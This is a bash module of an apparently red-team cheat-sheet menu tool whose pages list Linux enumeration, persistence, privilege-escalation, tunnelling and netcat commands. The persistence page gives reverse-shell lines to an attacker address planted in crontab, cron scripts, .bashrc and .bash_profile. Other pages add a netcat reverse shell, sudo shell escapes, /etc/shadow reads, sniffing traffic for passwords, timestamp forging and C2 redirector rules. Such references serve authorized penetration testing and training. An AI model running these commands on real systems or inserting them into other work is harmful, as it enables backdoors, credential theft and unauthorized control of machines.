#!/usr/bin/env bash
# modules/red/linux.sh

red_linux() {
    while true; do
        local c
        c=$(dialog --backtitle "$(backtitle)" \
            --title "  🐧 RED — Linux  " \
            --menu "\n  Linux Enumeration & Exploitation:\n" 20 65 8 \
            "1" "  🔎  Situational Awareness" \
            "2" "  🌐  Network Config & DNS" \
            "3" "  📁  File Manipulation" \
            "4" "  🔒  Persistence Techniques" \
            "5" "  ⬆️   Privilege Escalation" \
            "6" "  🛠️   Tools — SSH, TCPDump, Screen" \
            "7" "  🔥  IPTables — Red team use" \
            "8" "  ☀️   Solaris OS Commands" \
            3>&1 1>&2 2>&3) || return 0
        case "$c" in
            1) _red_lin_situ ;;
            2) _red_lin_net ;;
            3) _red_lin_files ;;
            4) _red_lin_persist ;;
            5) _red_lin_privesc ;;
            6) _red_lin_tools ;;
            7) _red_lin_iptables ;;
            8) _red_solaris ;;
        esac
    done
}

_red_lin_situ() { show_page "Linux — Situational Awareness" \
"═══════════════════════════════════════════════════════════════
  Linux — Situational Awareness                        [RED]
═══════════════════════════════════════════════════════════════

  OS + SYSTEM INFO
    df -h                    Disk usage
    uname -a                 Kernel + CPU info
    cat /etc/issue           OS info
    cat /etc/*release*       OS version
    cat /proc/version        Kernel info
    which bash sh zsh csh    Find shells
    fdisk -l                 Connected drives

  USERS + AUTH
    id                       Current user
    w                        Logged on users
    who -a                   All logged users
    last -a                  Past logins + boot time
    cat /etc/passwd          User list
    cat /etc/shadow          Password hashes (if root)
    cat /etc/sudoers         Sudo configuration

  PROCESSES
    ps -ef                   All processes
    ps auxf                  With hierarchy
    kill -9 <PID>
    killall <NAME>

  PACKAGE INFO
    dpkg -l | grep <PKG>     Debian/Ubuntu
    rpm -qa | grep <PKG>     RedHat/CentOS

  USER MANAGEMENT
    usermod --expiredate 1 --lock --shell /bin/nologin <USER>
    usermod --expiredate 99999 --unlock --shell /bin/bash <USER>
    chage -l <USER>
    userdel <USER>

  APT UPDATES
    apt-get update && apt-get upgrade
    apt-get dist-upgrade"; }

_red_lin_net() { show_page "Linux — Network Config & DNS" \
"═══════════════════════════════════════════════════════════════
  Linux — Network Config & DNS                         [RED]
═══════════════════════════════════════════════════════════════

  MONITOR SOCKETS (live every 3s)
    watch --interval 3 ss -t --all

  LIST ALL PORTS + PROGRAMS
    netstat -tulpn
    ss -tlnp

  NETWORK ACTIVITY BY USER
    lsof -i -u <USER> -a

  CHANGE MTU
    ifconfig <IF> mtu <SIZE>
    ip link set dev <IF> mtu <SIZE>

  CHANGE MAC ADDRESS
    ip link set dev <IF> down
    ip link set dev <IF> address <MAC>
    ip link set dev <IF> up

  ADD DNS SERVER
    echo \"nameserver <IP>\" >> /etc/resolv.conf

  DNS ZONE TRANSFER
    dig -x <IP>                   Reverse lookup
    host <IP_OR_HOST>             Domain lookup
    dig axfr <DOMAIN> @<DNS_IP>   Zone transfer
    host -t axfr -l <DOMAIN> <DNS_IP>

  NETWORK CONFIGURATION FILES
    /etc/network/interfaces  (Debian)
    /etc/netplan/*.yaml      (Ubuntu 18+)
    /etc/sysconfig/network-scripts/  (RedHat)"; }

_red_lin_files() { show_page "Linux — File Manipulation" \
"═══════════════════════════════════════════════════════════════
  Linux — File Manipulation                            [RED]
═══════════════════════════════════════════════════════════════

  FILE OPERATIONS
    diff <FILE_A> <FILE_B>
    rm -rf <DIR>
    shred -f -u <FILE>           Secure delete
    touch -r <ORIG> <MOD>        Copy timestamp
    touch -t YYYYMMDDHHMM <FILE>  Set timestamp
    wc -l <FILE>
    file <FILE>                  Determine type

  SEARCHING
    grep -c \"<STRING>\" <FILE>
    grep -Ria \"<PHRASE>\"         All files, recursive
    find / -name \"<PATTERN>\" 2>/dev/null
    find / -perm -4000 -exec ls -ld {} \\;  (SUID)
    find / -mtime -7 -type f 2>/dev/null   (modified <7d)

  COMPRESSION & CHUNKING
    tar -cf out.tar <INPUT>
    tar -xf file.tar
    tar -czf out.tar.gz <INPUT>
    tar -xzf file.tar.gz
    tar -cjf out.tar.bz2 <INPUT>
    tar -xjf file.tar.bz2
    gzip <FILE>  /  gzip -d file.gz
    zip -r out.zip <DIR>  /  unzip file.zip

  SPLIT & REJOIN
    split -b 5M <FILE> chunk_
    cat chunk_* > <FILE>

  FILE HASHING
    md5sum <FILE>
    sha1sum <FILE>
    sha256sum <FILE>

  MISC
    strip URL links:
    cat <FILE> | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*' | sort -u
    wget http://<URL> -O <FILE> -o /dev/null"; }

_red_lin_persist() { show_page "Linux — Persistence Techniques" \
"═══════════════════════════════════════════════════════════════
  Linux — Persistence Techniques                       [RED]
═══════════════════════════════════════════════════════════════

  RC.LOCAL (startup script)
    nano /etc/rc.local
    echo \"<FILE>\" >> /etc/rc.local

  LINUX SERVICE
    nano /etc/systemd/system/<SVC>.service

    [Unit]
    Description=My Service
    After=network.target

    [Service]
    ExecStart=<FILE>
    Restart=always

    [Install]
    WantedBy=multi-user.target

    systemctl enable <SVC>
    systemctl start <SVC>

  CRONTAB (runs every day at midnight)
    crontab -e
    0 0 * * * nc <ATTACKER_IP> <PORT> -e /bin/sh
    0 0 * * * <FULL_PATH_TO_PAYLOAD>

  POISONING EXISTING SCRIPTS
    # Find scripts run by other users / crons:
    find /etc/cron* /var/spool/cron -readable 2>/dev/null
    grep -rn \"<SCRIPT>\" /etc/crontab /etc/cron.d/

    # Append reverse shell to existing cron script:
    echo \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\" >> <SCRIPT>

  SSH AUTHORIZED KEYS
    mkdir ~/.ssh && touch ~/.ssh/authorized_keys
    echo \"<PUB_KEY>\" >> ~/.ssh/authorized_keys
    chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys

  BASH PROFILE POISONING
    echo \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\" >> ~/.bashrc
    echo \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\" >> ~/.bash_profile"; }

_red_lin_privesc() { show_page "Linux — Privilege Escalation" \
"═══════════════════════════════════════════════════════════════
  Linux — Privilege Escalation                         [RED]
═══════════════════════════════════════════════════════════════

  AUTOMATED TOOLS
    # LinPEAS (most comprehensive)
    curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

    # LinEnum
    wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
    bash LinEnum.sh -t

    # linux-smart-enumeration
    wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
    bash lse.sh -l1

  MANUAL CHECKS
    # SUID / SGID binaries
    find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | xargs ls -la

    # World-writable directories
    find / -type d -perm -0002 2>/dev/null

    # Sudo permissions
    sudo -l

    # Readable cron jobs
    cat /etc/crontab && ls /etc/cron.*

    # Writable /etc/passwd?
    ls -la /etc/passwd && ls -la /etc/shadow

    # Kernel version (check exploits)
    uname -a && cat /proc/version

    # Writable service files
    find /etc/systemd -writable 2>/dev/null

  GTFOBINS (sudo bypass)
    https://gtfobins.github.io
    # Example: sudo find with exec
    sudo find . -exec /bin/sh \\;

    # Example: sudo vim
    sudo vim -c ':!/bin/sh'

    # Example: sudo nmap (old versions)
    echo \"os.execute('/bin/sh')\" > exploit.nse
    sudo nmap --script=exploit.nse"; }

_red_lin_tools() { show_page "Linux — Tools (SSH, TCPDump, Screen, Netcat)" \
"═══════════════════════════════════════════════════════════════
  Linux — Essential Tools                              [RED]
═══════════════════════════════════════════════════════════════

  SSH
    /etc/ssh/ssh_known_hosts    System-wide known hosts
    ~/.ssh/known_hosts          User known hosts

    ssh-keygen -t dsa -f <OUTPUT>
    ssh-keygen -t rsa -f <OUTPUT>
    scp <SRC> <USER>@<IP>:/<DEST>   Upload
    scp <USER>@<IP>:/<SRC> ./       Download

  SSH FORWARDING (edit sshd_config)
    AllowTcpForwarding Yes
    GatewayPorts Yes
    service sshd restart

  SSH TUNNELS
    # Remote tunnel (expose local port to remote)
    ssh -R 0.0.0.0:8080:127.0.0.1:443 root@<REMOTE_IP>

    # Local tunnel
    ssh -L 8080:127.0.0.1:443 <USER>@<REMOTE_IP>

    # ProxyChains via SSH
    ssh -D 1080 <USER>@<REMOTE_IP>
    echo 'socks4 127.0.0.1 1080' >> /etc/proxychains.conf
    proxychains nmap -sT -Pn -p80,443 <TARGET>

  TCPDUMP ESSENTIALS
    tcpdump -i eth0 -XX -w out.pcap
    tcpdump tcp port 80 and dst 2.2.2.2
    tcpdump -i eth0 -tttt dst <IP> and not dst port 22
    tcpdump -n -A -s0 port http | egrep -i 'pass=|pwd='
    tcpdump src 1.1.1.1
    tcpreplay -i eth0 out.pcap

  SCREEN SESSION MANAGER
    screen -S <name>       New named session
    screen -ls             List sessions
    screen -r <name>       Attach to session
    Ctrl+a d               Detach
    Ctrl+a c               New window
    Ctrl+a [0-9]           Switch window
    Ctrl+a ?               Help

  NETCAT
    nc -lvnp <PORT>        Listen
    nc -e /bin/bash <IP> <PORT>  Reverse shell
    nc -w 3 <IP> <PORT> < <FILE>  Send file
    nc -lvnp <PORT> > <FILE>      Receive file"; }

_red_lin_iptables() { show_page "Linux — IPTables (Red Team)" \
"═══════════════════════════════════════════════════════════════
  Linux — IPTables for Red Team                        [RED]
═══════════════════════════════════════════════════════════════

  SAVE / RESTORE
    iptables-save -c > rules.out
    iptables-restore < rules.out

  LIST RULES
    iptables -L -v --line-numbers
    iptables -L -t nat --line-numbers

  FLUSH
    iptables -F
    iptables -t nat -F

  PORT FORWARDING (C2 redirector)
    echo \"1\" > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A PREROUTING -i <IF> -p tcp \\
      --dport <PORT> -j DNAT --to <C2_IP>:<PORT>
    iptables -t nat -A POSTROUTING -j MASQUERADE

  ALLOW SSH ONLY (lockdown pivot box)
    iptables -A INPUT -s <TEAM_IP> -p tcp --dport 22 -j ACCEPT
    iptables -A INPUT -j DROP
    iptables -A OUTPUT -d <TEAM_IP> -j ACCEPT
    iptables -A OUTPUT -j DROP

  ALLOW SSH OUTBOUND ONLY
    iptables -A OUTPUT -o <IF> -p tcp --dport 22 \\
      -m state --state NEW,ESTABLISHED -j ACCEPT
    iptables -A INPUT -i <IF> -p tcp --sport 22 \\
      -m state --state ESTABLISHED -j ACCEPT

  ALLOW ICMP OUT
    iptables -A OUTPUT -o <IF> -p icmp \\
      --icmp-type echo-request -j ACCEPT

  LOG + DROP
    iptables -N LOGGING
    iptables -A INPUT -j LOGGING
    iptables -A LOGGING -m limit --limit 4/min \\
      -j LOG --log-prefix \"DROPPED\"
    iptables -A LOGGING -j DROP

  SERVICE MANIPULATION
    systemctl list-unit-files --type=service
    service <n> start / stop / status
    systemctl disable <n>"; }

_red_solaris() { show_page "Solaris OS Commands" \
"═══════════════════════════════════════════════════════════════
  Solaris OS Commands                                  [RED]
═══════════════════════════════════════════════════════════════

  FILE SYSTEM STRUCTURE
    /etc/vfstab          Mount table
    /var/adm/authlog     Login attempt log
    /etc/default/*       Default settings
    /etc/system          Kernel modules & config
    /var/adm/messages    System logs
    /etc/auto_*          Automounter config
    /etc/inet/ipnodes    IPv4/IPv6 host file

  NETWORKING
    ifconfig -a
    netstat -in
    snoop -d <IF> -c <N> -o output.pcap

  SYSTEM
    iostat -n
    shutdown -i6 g0 -y     Restart
    dfmounts               List NFS clients
    smc                    Management GUI

  USERS
    cat /etc/passwd
    logins -l <USER>
    passwd <USER>"; }
